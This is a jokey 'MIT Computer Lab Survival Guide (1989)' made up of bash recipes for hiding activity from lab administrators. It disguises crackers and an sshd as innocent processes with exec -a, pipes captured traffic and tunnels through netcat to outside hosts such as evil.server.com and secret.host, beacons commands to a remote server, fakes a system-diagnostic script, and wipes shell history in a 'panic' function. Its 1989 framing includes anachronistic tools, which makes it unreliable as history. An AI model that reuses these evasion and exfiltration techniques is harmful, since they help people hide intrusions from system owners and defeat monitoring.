# The MIT Computer Lab Survival Guide (1989)
## Or: How to Look Productive While Building Revolutionary Crypto

### The Problem
- Lab monitors checking what you're doing
- CPU time quotas (THIS MONTH: 10 HOURS MAX)
- Sysadmins running `who`, `ps aux`, `lastlog`
- Your advisor wondering why you're always "compiling"

### The Classic Tricks

#### 1. The Innocent Process Names
```bash
# What it looks like to sysadmin
$ ps aux | grep hans
hans  1337  0.0  0.1  2048  512 pts/0  S   02:30  0:00 vi thesis.tex
hans  1338  0.0  0.1  2048  512 pts/1  S   02:31  0:00 cc -O2 homework.c
hans  1339  0.0  0.1  2048  512 pts/2  S   02:32  0:00 latex report.tex

# What's actually running
$ # That "vi thesis.tex"? It's actually:
$ exec -a "vi thesis.tex" ./sshd

$ # That innocent compiler? 
$ exec -a "cc -O2 homework.c" ./brute_force_des

$ # That LaTeX process?
$ exec -a "latex report.tex" ./irc_client
```

#### 2. The Terminal Multiplexer Magic
```bash
# Set your terminal title to something boring
$ echo -e "\033]0;Editing: thesis_chapter_3.tex\007"

# But actually running:
$ screen -S "homework"
# Ctrl-A C (new window)
$ ./build_crypto_tool.sh
# Ctrl-A C (new window)  
$ nc crypto.underground.net 6667
# Ctrl-A C (new window)
$ tail -f /var/log/messages | grep -v hans  # watching for sysadmins
```

#### 3. The Netcat Symphony
```bash
# The "Innocent" Data Pipeline
$ # Looks like data processing
$ cat /usr/share/dict/words | grep "^a" | wc -l > analysis.txt

# The Real Pipeline (hidden in another screen)
$ nc -l -p 31337 | tee captured.dat | \
  sed 's/password/XXXXX/g' | \
  nc darkside.mit.edu 1337 | \
  xor_cipher > ~/thesis/appendix_b.dat

# Even better: The Double Reverse
$ mkfifo /tmp/.boring_pipe
$ cat /tmp/.boring_pipe | nc evil.server.com 22 &
$ nc -l -p 8080 > /tmp/.boring_pipe &
# Now localhost:8080 is a tunnel to evil.server.com:22
```

#### 4. The Academic Camouflage
```bash
#!/bin/bash
# Name this: "statistical_analysis.sh"

# Print some academic-looking output
echo "Loading dataset..."
sleep 2
echo "Performing Fourier transformation..."
sleep 1
echo "Calculating chi-square values..."

# Actually running your crypto experiments
(./des_cracker 2>&1 | sed 's/cracking/analyzing/g' \
  | sed 's/password/dataset/g' \
  | sed 's/found key/correlation detected/g') &

# Keep printing academic nonsense
while true; do
  echo "Iteration $RANDOM: Convergence delta = 0.$(($RANDOM % 999))"
  sleep 5
done
```

#### 5. The Process Name Shuffle
```bash
#!/bin/bash
# shuffle.sh - Makes you look productive

BORING_NAMES=(
  "emacs homework.c"
  "vi lab_report.tex"  
  "gcc -O3 assignment.c"
  "make clean"
  "latex thesis.tex"
  "gnuplot data.csv"
  "awk '{print $2}' results.dat"
)

while true; do
  # Pick random boring name
  NAME=${BORING_NAMES[$RANDOM % ${#BORING_NAMES[@]}]}
  
  # Run actual program with fake name
  exec -a "$NAME" "$1"
  
  # If it exits, wait a bit and restart
  sleep $(($RANDOM % 60))
done

# Usage: ./shuffle.sh ./my_secret_program
```

#### 6. The Network Traffic Masquerade
```bash
# Hide your SSH development as "NFS traffic"
$ # Tunnel through NFS port
$ socat TCP-LISTEN:2049,reuseaddr,fork TCP:suspicious.server.com:22 &

$ # Make your netcat look like sendmail
$ exec -a "sendmail -q30m" nc -l -p 25 | ./crypto_chat

$ # The "DNS Query" (actually a backdoor)
$ while true; do
    echo "Querying nameserver..." # for show
    nc -u -w1 ns.mit.edu 53 < /dev/urandom | head -c 100 > /dev/null
    nc -u -w1 my.real.server.com 31337 < commands.txt
    sleep 300  # "DNS cache timeout"
  done
```

#### 7. The CPU Time Laundering
```bash
#!/bin/bash
# Spread CPU usage across multiple users (if you have friends)

# Split your job into pieces
split -n 10 big_computation.sh chunk_

# Have your friends run pieces
for i in {0..9}; do
  echo "Hey user$i, run this 'homework': ./chunk_$i" | 
    write user$i
done

# Collect results later
for i in {0..9}; do
  nc -l -p $((31337 + $i)) > result_$i.dat &
done
```

#### 8. The Ultimate Disguise
```bash
# The "System Maintenance" Script
cat > /tmp/system_check.sh << 'EOF'
#!/bin/bash
# MIT System Diagnostic Tool v1.2
# DO NOT INTERRUPT - AUTHORIZED PERSONNEL ONLY

echo "=== MIT SYSTEM DIAGNOSTIC STARTING ==="
echo "Phase 1: Memory verification..."
sleep 3
echo "[OK] Memory checksums valid"
echo "Phase 2: Filesystem integrity check..."

# Actually running your stuff
(./sshd 2>&1 | while read line; do
  echo "[fsck] inode $(($RANDOM % 99999)): $line"
done) &

echo "Phase 3: Network connectivity test..."
# Your netcat tunnels
nc -l -p 22222 <> /tmp/backpipe | nc secret.host 22 <> /tmp/backpipe &

echo "=== DIAGNOSTIC RUNNING - DO NOT TERMINATE ==="
echo "Expected completion: $(date -d '+4 hours')"
echo "Contact sysadmin@mit.edu if urgent"

# Keep printing official-looking output
while true; do
  echo "[$(date '+%H:%M:%S')] Verifying sector $(($RANDOM))..."
  sleep 10
done
EOF

chmod +x /tmp/system_check.sh
exec -a "[kernel thread]" /tmp/system_check.sh
```

#### 9. The Social Engineering
```bash
# Leave decoy terminals open
$ # Terminal 1: 
$ vi ~/.bashrc
# Add comment: "# TODO: Finish homework due Monday"

$ # Terminal 2:
$ tail -f ~/assignments/big_important_homework.c

$ # Terminal 3 (hidden):
$ # Your actual work

# The "I'm debugging the professor's code" excuse
$ exec -a "gdb /usr/local/bin/professor_smith_project" ./my_hacking_tool
```

#### 10. The Emergency Escape
```bash
# The panic button (bind to a key)
panic() {
  # Kill all suspicious processes
  killall -9 sshd crypto_tool nc 2>/dev/null
  
  # Clear history
  history -c
  echo "cd ~" > ~/.bash_history
  echo "ls" >> ~/.bash_history
  echo "vi homework.c" >> ~/.bash_history
  
  # Open innocent windows
  emacs homework.c &
  gnuplot some_data.csv &
  man malloc &
  
  # Clear screen with academic output
  clear
  cat ~/fake_compiler_output.txt
}

# Bind to Ctrl-X
bind -x '"\C-x": panic'
```

### The Golden Rules

1. **Always have a cover story**: "I'm analyzing network protocols for my thesis"
2. **Name everything academically**: crypto_crack → "statistical_analyzer"
3. **Log rotation is your friend**: Your stuff disappears with system logs
4. **Make friends with operators**: They warn you about inspections
5. **Use idle time**: 2-6 AM is golden
6. **Quota tricks**: Symlink large files to /tmp (not counted)
7. **The best hiding**: Make your hack look like badly written homework

### The MIT Special
```bash
# The "Athena Workstation" special
# Make your process look like part of Project Athena
exec -a "athena-update-checker" ./sshd

# Hide files in course directories
mkdir -p ~/course/6.033/project/.hidden/
# Nobody checks boring coursework directories

# The "TA Grading Script" cover
exec -a "grade_submissions.pl" ./password_cracker
```

### Final Wisdom

Remember: We're not breaking rules, we're "conducting security research for our thesis." 

When caught: "Professor Rivest suggested I explore practical applications of cryptographic protocols..."

And always: Keep a real homework file open. Just in case.

---

*"The best place to hide is in plain sight, preferably behind a process named 'latex thesis.tex'"*
- Every MIT Student Ever (1989)